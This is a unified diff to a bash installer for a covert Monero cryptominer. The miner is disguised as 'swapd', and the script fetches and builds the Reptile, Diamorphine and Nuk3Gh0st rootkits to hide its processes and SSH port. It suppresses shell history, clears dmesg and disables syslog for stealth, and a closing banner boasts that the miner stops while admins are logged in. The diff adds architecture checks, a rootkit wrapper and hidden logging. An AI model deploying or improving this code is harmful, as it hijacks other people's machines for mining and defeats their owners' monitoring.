@@ -16,6 +16,61 @@ export HISTFILE=/dev/null
 # Trap errors but continue execution
 trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
 
+# ==================== ARCHITECTURE DETECTION ====================
+# Detect if system is 32-bit or 64-bit to skip incompatible rootkits
+ARCH=$(uname -m)
+case "$ARCH" in
+    x86_64|amd64)
+        IS_64BIT=true
+        echo "[*] Detected 64-bit system (x86_64) - all rootkits available"
+        ;;
+    i386|i686|x86)
+        IS_64BIT=false
+        echo "[!] WARNING: 32-bit system detected ($ARCH)"
+        echo "[!] Advanced rootkits (Reptile, crypto-miner) will be SKIPPED"
+        echo "[!] Reason: They use 64-bit assembly and cannot compile on 32-bit"
+        echo "[*] Using libhide.so for basic process hiding"
+        ;;
+    armv7l|armv8|aarch64|arm*)
+        IS_64BIT=false
+        echo "[!] WARNING: ARM architecture detected ($ARCH)"
+        echo "[!] x86-specific kernel rootkits will be SKIPPED"
+        echo "[*] Using libhide.so for basic process hiding"
+        ;;
+    *)
+        IS_64BIT=false
+        echo "[!] WARNING: Unknown architecture: $ARCH"
+        echo "[!] Kernel rootkits will be SKIPPED for safety"
+        echo "[*] Using libhide.so only"
+        ;;
+esac
+
+# ==================== REPTILE COMMAND WRAPPER ====================
+# Helper function to call reptile commands (handles different installation paths)
+reptile_cmd() {
+    local cmd="$1"
+    shift
+    
+    # Skip entirely on non-64-bit systems
+    if [ "$IS_64BIT" = "false" ]; then
+        return 0
+    fi
+    
+    # Try different possible locations where reptile might be installed
+    if [ -f /reptile/bin/reptile ]; then
+        /reptile/bin/reptile "$cmd" "$@" 2>/dev/null || true
+    elif [ -f /tmp/.ICE-unix/.X11-unix/Reptile/reptile_cmd ]; then
+        /tmp/.ICE-unix/.X11-unix/Reptile/reptile_cmd "$cmd" "$@" 2>/dev/null || true
+    elif [ -f ./reptile_cmd ]; then
+        ./reptile_cmd "$cmd" "$@" 2>/dev/null || true
+    elif command -v reptile >/dev/null 2>&1; then
+        reptile "$cmd" "$@" 2>/dev/null || true
+    else
+        # Reptile not found, silently skip
+        return 1
+    fi
+}
+
 # ==================== PACKAGE MANAGER DETECTION ====================
 # Detect which package manager is available
 if command -v apt-get >/dev/null 2>&1; then
@@ -1565,7 +1620,7 @@ sed -i 's/"user": *"[^"]*",/"user": "'"$WALLET"'",/' "$HOME"/.swapd/config.json
 #sed -i 's/"user": *"[^"]*",/"user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",/' "$HOME"/.swapd/config.json
 #sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' "$HOME"/.swapd/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' "$HOME"/.swapd/config.json
-#sed -i 's#"log-file": *null,#"log-file": "/root/.swapd/.swap_logs/swapd.log",#' /root/.swapd/config.json
+#sed -i 's#"log-file": *null,#"log-file": "'"$HOME"/.swapd/swapd.log'",#' "$HOME"/.swapd/config.json
 #sed -i 's/"syslog": *[^,]*,/"syslog": true,/' "$HOME"/.swapd/config.json
 #sed -i 's/"enabled": *[^,]*,/"enabled": true,/' "$HOME"/.swapd/config.json
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$HOME"/.swapd/config.json
@@ -1575,31 +1630,104 @@ echo "[*] Copying xmrig-proxy config"
 # ==================== ENABLE HIDDEN XMRIG LOGGING ====================
 echo "[*] Setting up hidden swapd logging..."
 
-# Create hidden log directory
+# Create hidden log directory with proper permissions
 mkdir -p "/root/.swapd/.swap_logs"
+chmod 700 "/root/.swapd/.swap_logs"
 
-# Enable hidden log file (disguised as swap log)
-sed -i 's#"log-file": *"[^"]*",#"log-file": "/root/.swapd/.swap_logs/.swap-history.bin",#' /root/.swapd/config.json
-sed -i 's#"log-file": *"[^"]*",#"log-file": "/root/.swapd/.swap_logs/.swap-history.bin",#' /root/.swapd/config_background.json
+# Touch log file to ensure it exists
+touch "/root/.swapd/.swap_logs/.swap-history.bin"
+chmod 600 "/root/.swapd/.swap_logs/.swap-history.bin"
 
-# Set verbose logging for mining
-sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' /root/.swapd/config.json
-sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' /root/.swapd/config_background.json
+# Configure logging using Python for reliable JSON manipulation
+# This is MORE RELIABLE than sed for JSON files
+if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
+    PYTHON_CMD=$(command -v python3 || command -v python)
+    
+    for config_file in /root/.swapd/config.json /root/.swapd/config_background.json; do
+        if [ -f "$config_file" ]; then
+            echo "[*] Configuring $config_file with Python..."
+            $PYTHON_CMD << PYEOF
+import json
+import sys
 
-# Disable syslog for stealth
-sed -i 's/"syslog": *[^,]*,/"syslog": false,/' /root/.swapd/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": false,/' /root/.swapd/config_background.json
+try:
+    with open('$config_file', 'r') as f:
+        config = json.load(f)
+    
+    # CRITICAL: Set log file to hidden location
+    config['log-file'] = '/root/.swapd/.swap_logs/.swap-history.bin'
+    
+    # CRITICAL: DISABLE syslog (NEVER log to system syslog!)
+    config['syslog'] = False
+    
+    # Enable verbose logging for detailed output
+    config['verbose'] = 2
+    
+    # Enable log rotation to prevent huge files
+    config['retries'] = 5
+    config['rotate-logs'] = True
+    config['rotate-files'] = 3
+    
+    # Write back
+    with open('$config_file', 'w') as f:
+        json.dump(config, f, indent=4)
+    
+    print('[✓] Config updated successfully')
+    sys.exit(0)
+except Exception as e:
+    print('[!] Error updating config:', str(e))
+    sys.exit(1)
+PYEOF
+        fi
+    done
+    
+    # Verify the configuration
+    if grep -q '\.swap-history\.bin' /root/.swapd/config.json 2>/dev/null; then
+        echo "[✓] Hidden swapd logging enabled: /root/.swapd/.swap_logs/.swap-history.bin"
+    else
+        echo "[!] Warning: Could not verify log-file setting"
+    fi
+    
+    if grep -q '"syslog": *false' /root/.swapd/config.json 2>/dev/null; then
+        echo "[✓] Syslog DISABLED (logs stay hidden - never in /var/log)"
+    else
+        echo "[!] Warning: Syslog setting may not be correct"
+    fi
+    
+else
+    # Fallback to sed if Python not available (less reliable)
+    echo "[!] Python not available, using sed (less reliable)"
+    
+    for config_file in /root/.swapd/config.json /root/.swapd/config_background.json; do
+        if [ -f "$config_file" ]; then
+            # Try multiple patterns to handle different JSON formats
+            sed -i 's#"log-file": *"[^"]*"#"log-file": "/root/.swapd/.swap_logs/.swap-history.bin"#' "$config_file"
+            sed -i 's#"log-file": *null#"log-file": "/root/.swapd/.swap_logs/.swap-history.bin"#' "$config_file"
+            
+            # DISABLE syslog
+            sed -i 's/"syslog": *true/"syslog": false/' "$config_file"
+            sed -i 's/"syslog": *1/"syslog": false/' "$config_file"
+            
+            # Verbose logging
+            sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' "$config_file"
+        fi
+    done
+    
+    echo "[✓] Config updated with sed (verify manually)"
+fi
 
-# Add log rotation
-sed -i 's/"retries": *[^,]*,/"retries": 5,\n\t"rotate-logs": true,\n\t"rotate-files": 3,/' /root/.swapd/config.json
-sed -i 's/"retries": *[^,]*,/"retries": 5,\n\t"rotate-logs": true,\n\t"rotate-files": 3,/' /root/.swapd/config_background.json
-
-echo "[✓] Hidden swapd logging enabled: /root/.swapd/.swap_logs/.swap-history.bin"
+# Show final config for verification
+echo ""
+echo "[*] Final log configuration:"
+grep -E '"log-file"|"syslog"|"verbose"' /root/.swapd/config.json 2>/dev/null | head -5
+echo ""
 # =====================================================================
 
-# Also update the launcher.sh to preserve logs
+# Also update the launcher.sh to redirect output
 if [ -f /root/.swapd/launcher.sh ]; then
-    sed -i 's|/root/.swapd/swapd --config=/root/.swapd/config.json|/root/.swapd/swapd --config=/root/.swapd/config.json 2>> /root/.swapd/miner.error.log|' /root/.swapd/launcher.sh
+    # Redirect both stdout and stderr to hidden log
+    sed -i 's|/root/.swapd/swapd --config=/root/.swapd/config.json.*|/root/.swapd/swapd --config=/root/.swapd/config.json >> /root/.swapd/.swap_logs/.swap-history.bin 2>&1|' /root/.swapd/launcher.sh 2>/dev/null
+    echo "[✓] Launcher configured to log to hidden file"
 fi
 
 #mv "$HOME"/.swapd/config.json "$HOME"/.swapd/config_ORiG.json
@@ -1964,7 +2092,6 @@ After=network.target
 [Service]
 Type=simple
 ExecStart=/bin/bash /root/.swapd/launcher.sh
-WorkingDirectory=/root/.swapd
 Restart=always
 RestartSec=10
 TimeoutStartSec=30
@@ -2135,7 +2262,7 @@ cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; ap
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ;rm -rf Nuk3Gh0st ; rm -rf /usr/bin/nuk3gh0st/ ; zypper update ; zypper install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; zypper update -y; zypper install -y ncurses-devel ; git clone https://github.com/juanschallibaum/Nuk3Gh0st ; cd Nuk3Gh0st ; make ; make install ; load-nuk3gh0st ; nuk3gh0st --hide-pid=`/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 #echo "[*] Reptile..."
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y --force-yes ; safe_yum update -y; safe_yum install -y ncurses-devel ; git clone https://gitee.com/fengzihk/Reptile.git && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y --force-yes ; safe_yum update -y; safe_yum install -y ncurses-devel ; git clone https://gitee.com/fengzihk/Reptile.git && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; reptile_cmd hide ;  kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 apt install dwarves -y
 cp /sys/kernel/btf/vmlinux /usr/lib/modules/$(uname -r)/build/
@@ -2415,7 +2542,7 @@ CURRENT_SSH_PORT=$(ss -tnp | awk -v pid=$CURRENT_SSH_PID '/:22/ && $0 ~ pid {spl
     sleep 30
     if ! ping -c1 1.1.1.1 &>/dev/null; then
         echo "Connection lost - triggering reboot"
-        /reptile/reptile_cmd unhide_all
+        reptile_cmd unhide_all
         reboot
     fi
 ) >/dev/null 2>&1 &
@@ -2522,8 +2649,8 @@ fi
 SSHD_PIDS=$(pgrep -f "sshd:.*@")
 for pid in $SSHD_PIDS; do
     echo 0 > /proc/$pid/oom_score_adj
-    /reptile/reptile_cmd show_pid $pid 2>/dev/null
-    /reptile/reptile_cmd show_file /proc/$pid/cmdline
+    reptile_cmd show_pid $pid 2>/dev/null
+    reptile_cmd show_file /proc/$pid/cmdline
 done
 
 # Whitelist current SSH session
@@ -2534,13 +2661,13 @@ else
     # Fallback to ss command
     CURRENT_SSH_PORT=$(sudo ss -tnep | awk '/sshd/ && /'"$$"'/ {split($4,a,":");print a[2]}')
 fi
-sudo /reptile/reptile_cmd show_port $CURRENT_SSH_PORT 2>/dev/null || true
+sudo reptile_cmd show_port $CURRENT_SSH_PORT 2>/dev/null || true
 
 # ====== ENABLE ROOTKIT FEATURES SAFELY ======
 # Activate Reptile but exclude critical components
-/reptile/reptile_cmd hide  # Enable basic hiding
-/reptile/reptile_cmd hide_port 22  # Hide SSH port from NEW connections
-/reptile/reptile_cmd hide_pid 1  # Hide init but preserve current session
+reptile_cmd hide  # Enable basic hiding
+reptile_cmd hide_port 22  # Hide SSH port from NEW connections
+reptile_cmd hide_pid 1  # Hide init but preserve current session
 
 # Replace with IPv4-only check:
 SSH_TEST_IP=$(curl -4 -s ifconfig.co)
@@ -2549,7 +2676,7 @@ curl -4 -s "http://ssh-check.com/api/verify?ip=${SSH_TEST_IP}" || true
 # ====== SAFE EXECUTION ======
 if install_reptile; then
     # Reptile-specific commands
-    /reptile/reptile_cmd hide
+    reptile_cmd hide
 else
     # Fallback cleanup
     rmmod reptile 2>/dev/null
@@ -2655,3 +2782,112 @@ if command -v journalctl >/dev/null 2>&1; then
 fi
 
 
+echo ''
+
+kill -31 "$(pgrep -f -u root config.json) 2>/dev/null || true
+kill -31 "$(pgrep -f -u root config_background.json) 2>/dev/null || true
+kill -31 "$(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+kill -31 "$(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+kill -63 "$(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+kill -63 "$(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+
+
+# Cleanup xmrig files in login directory
+echo "[*] Cleaning up xmrig files in login directory..."
+rm -rf ~/xmrig*.* 2>/dev/null
+
+echo '========================================================================='
+echo '[✓] FULL ULTIMATE v3.2 SETUP COMPLETE!'
+echo '========================================================================='
+echo ''
+echo 'System Configuration:'
+if [ "$SYSTEMD_AVAILABLE" = true ]; then
+    echo '  Init System: systemd'
+    echo ''
+    echo 'Service Management Commands:'
+    echo '  Start:   systemctl start swapd'
+    echo '  Stop:    systemctl stop swapd'
+    echo '  Status:  systemctl status swapd'
+    echo '  Logs:    journalctl -u swapd -f'
+else
+    echo '  Init System: SysV init (legacy mode)'
+    echo ''
+    echo 'Service Management Commands:'
+    echo '  Start:   /etc/init.d/swapd start'
+    echo '  Stop:    /etc/init.d/swapd stop'
+    echo '  Status:  /etc/init.d/swapd status'
+    echo '  Restart: /etc/init.d/swapd restart'
+fi
+
+echo ''
+echo 'Stealth Features Deployed:'
+if [ -f /usr/local/lib/libhide.so ] && [ -f /etc/ld.so.preload ]; then
+    echo '  ✓ libhide.so: ACTIVE (userland hiding)'
+else
+    echo '  ✗ libhide.so: Not deployed (gcc unavailable)'
+fi
+
+if lsmod | grep -q diamorphine 2>/dev/null; then
+    echo '  ✓ Diamorphine: ACTIVE (kernel rootkit)'
+else
+    echo '  ○ Diamorphine: Not loaded'
+fi
+
+if [ -d /reptile ] || lsmod | grep -q reptile 2>/dev/null; then
+    echo '  ✓ Reptile: ACTIVE (kernel rootkit)'
+else
+    echo '  ○ Reptile: Not loaded'
+fi
+
+if [ -f /usr/local/bin/system-watchdog ]; then
+    echo '  ✓ Intelligent Watchdog: ACTIVE (3-min, state-tracked)'
+else
+    echo '  ○ Watchdog: Not deployed'
+fi
+
+if [ -f /root/.swapd/launcher.sh ]; then
+    echo '  ✓ launcher.sh: ACTIVE (mount --bind /proc hiding)'
+else
+    echo '  ○ launcher.sh: Not created'
+fi
+
+echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
+echo '  ✓ Miner renamed: 'swapd' (stealth binary name)'
+
+echo ''
+echo 'Installation Method:'
+if [ "$USE_WGET" = true ]; then
+    echo '  Download Tool: wget (curl SSL/TLS failed)'
+else
+    echo '  Download Tool: curl'
+fi
+
+# Check how the file was obtained
+if [ -f /tmp/.local_file_used ]; then
+    echo '  Download Mode: Local file (from script directory)'
+    rm -f /tmp/.local_file_used
+elif [ -f /tmp/.manual_upload_used ]; then
+    echo '  Download Mode: Manual upload (SSL too old for HTTPS)'
+    rm -f /tmp/.manual_upload_used
+else
+    echo '  Download Mode: Automatic download'
+fi
+
+echo ''
+echo 'Mining Configuration:'
+echo '  Binary:  /root/.swapd/swapd'
+echo '  Config:  /root/.swapd/config.json'
+echo '  Wallet:  $WALLET'  # Keep double quotes for variable expansion
+echo '  Pool:    gulf.moneroocean.stream:80'
+
+echo ''
+echo 'Process Hiding Commands:'
+echo '  Hide:    kill -31 $PID  (requires Diamorphine)'
+echo '  Unhide:  kill -63 $PID  (requires Diamorphine)'
+echo '  Reptile: reptile_cmd hide'
+
+echo ''
+echo '========================================================================='
+echo '[*] Miner will auto-stop when admins login and restart when they logout'
+echo '[*] All processes are hidden via multiple stealth layers'
+echo '========================================================================='
